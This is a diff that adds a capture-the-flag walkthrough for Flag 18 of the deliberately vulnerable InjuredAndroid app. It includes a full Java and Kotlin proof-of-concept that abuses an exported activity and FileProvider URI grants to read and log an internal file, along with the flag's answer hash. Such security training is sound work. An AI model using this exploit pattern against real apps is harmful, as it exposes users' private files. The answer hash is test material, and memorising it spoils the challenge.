@@ -630,7 +630,222 @@ After Flutter ssl pinning plugin is bypassed the response endpoint will show the
 
 ### Flag 18 - 
 
-Coming soon to a theatre near you!
+#### Recon
+
+First lets take a look at the File Provider in `AndroidManifest.xml`.
+
+```xml
+
+ <activity
+            android:name=".FlagEighteenActivity"
+            android:exported="true"
+            android:label="@string/title_activity_flag_eighteen"
+            android:theme="@style/AppTheme.NoActionBar" />
+
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:authorities="b3nac.injuredandroid.fileprovider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/file_paths" />
+        </provider>
+
+```
+
+What we are going to need is the `android:authorities` specified for our proof of concept. It's important to note that `android:grantUriPermissions="true"` is set to true. This means that an exported activity can interact with this File Provider via intents that specify the correct uri according to `file_paths.xml`.
+
+```xml
+<?xml version ="1.0" encoding ="utf-8"?>
+<paths xmlns:android="http://schemas.android.com/apk/res/android">
+    <files-path name="files" path="/" />
+</paths>
+```
+
+The specification of `files-path` equals `/data/data/b3nac.injuredandroid/files`.
+
+#### Using another activity to move files to the correct directory
+
+The Deep link ACE activity or flag 13 will move the test file needed to complete this challenge. Using any of these deep links should work.
+
+<html>
+<p><a href="flag13://rce?binary=narnia.x86_64&param=testOne">Test one!</p>
+<p><a href="flag13://rce?binary=narnia.x86_64&param=testTwo">Test two!</p>
+<p><a href="flag13://rce?binary=narnia.x86_64&param=testThree">Test three!</p>
+<p><a href="flag13://rce?combined=Treasure_Planet">OH SNAP!</p>
+</html> 
+
+The logic moving the files.
+
+```kotlin
+
+if (intent != null && intent.data != null) {
+            copyAssets()
+            val data = intent.data
+
+```
+
+So if the intent is not null and the intent.data is not equal to null the files in the assets directory will be copied to `/data/data/b3nac.injuredandroid/files`.
+
+#### Create the proof of concept.
+
+Create the intent.
+
+`Intent intent = new Intent();`
+
+Create the File Provider uri.
+
+`intent.setData(Uri.parse("content://b3nac.injuredandroid.fileprovider/files/test"));`
+
+Grant uri permissions.
+
+`intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);`
+
+Set the exported activity class name to call the File Provider.
+
+`intent.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.FlagEighteenActivity");`
+
+Get the result of the uri call.
+
+`startActivityForResult(intent, 0);`
+
+We also need to setup the `onActivityResult` method to print the data from the internal file.
+
+```java
+
+ protected void onActivityResult( int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        
+        try {
+            Log.d("OHNO", IOUtils.toString(Objects.requireNonNull(getContentResolver().openInputStream(Objects.requireNonNull(data.getData())))));
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+```
+
+If we put all that together the proof of concept looks like this!
+
+```java
+
+package b3nacinjured.pocformyohnocontentprovider;
+
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Bundle;
+
+import com.google.android.material.floatingactionbutton.FloatingActionButton;
+import com.google.android.material.snackbar.Snackbar;
+
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.appcompat.widget.Toolbar;
+
+import android.util.Log;
+import android.view.View;
+
+import org.apache.commons.io.IOUtils;
+
+import java.io.IOException;
+import java.util.Objects;
+
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        Toolbar toolbar = findViewById(R.id.toolbar);
+        setSupportActionBar(toolbar);
+
+        FloatingActionButton fab = findViewById(R.id.fab);
+        fab.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                Snackbar.make(view, "OHNO PoC", Snackbar.LENGTH_LONG)
+                        .setAction("Action", null).show();
+            }
+        });
+
+        Intent intent = new Intent();
+        intent.setData(Uri.parse("content://b3nac.injuredandroid.fileprovider/files/test"));
+        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+        intent.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.FlagEighteenActivity");
+        startActivityForResult(intent, 0);
+
+    }
+
+    protected void onActivityResult( int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+
+        try {
+            Log.d("OHNO", IOUtils.toString(Objects.requireNonNull(getContentResolver().openInputStream(Objects.requireNonNull(data.getData())))));
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+
+```
+
+Or if you prefer Kotlin.
+
+```kotlin
+
+package b3nacinjured.pocformyohnocontentprovider
+
+import android.content.Intent
+import android.net.Uri
+import android.os.Bundle
+import android.util.Log
+import androidx.appcompat.app.AppCompatActivity
+import androidx.appcompat.widget.Toolbar
+import com.google.android.material.floatingactionbutton.FloatingActionButton
+import com.google.android.material.snackbar.Snackbar
+import org.apache.commons.io.IOUtils
+import java.io.IOException
+import java.util.Objects.requireNonNull
+
+class MainActivity : AppCompatActivity() {
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_main)
+        val toolbar = findViewById<Toolbar>(R.id.toolbar)
+        setSupportActionBar(toolbar)
+        val fab = findViewById<FloatingActionButton>(R.id.fab)
+        fab.setOnClickListener { view ->
+            Snackbar.make(view, "OHNO PoC", Snackbar.LENGTH_LONG)
+                    .setAction("Action", null).show()
+        }
+        val intent = Intent()
+        intent.data = Uri.parse("content://b3nac.injuredandroid.fileprovider/files/test")
+        intent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
+        intent.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.FlagEighteenActivity")
+        startActivityForResult(intent, 0)
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        try {
+            Log.d("OHNO", IOUtils.toString(requireNonNull(requireNonNull(data!!.data)?.let { contentResolver.openInputStream(it) })))
+        } catch (e: IOException) {
+            e.printStackTrace()
+        }
+    }
+}
+
+```
+
+Now when the proof of concept is used it won't display the `Log.d` result unless the back button is pressed. After pressing the back button `text.txt` will be displayed by logcat with the label `OHNO`.
+
+When submitting only text.txt notice that this isn't quite yet the flag value that's needed. I left a hint in the submit function as a comment. :)
+
+`// MD5`
+
+Hashing `text.txt` with the MD5 algorithm will provide the hash `034d361a5942e67697d17534f37ed5a9`. Submit this value to complete the challenge! 
+
 
 ---
 
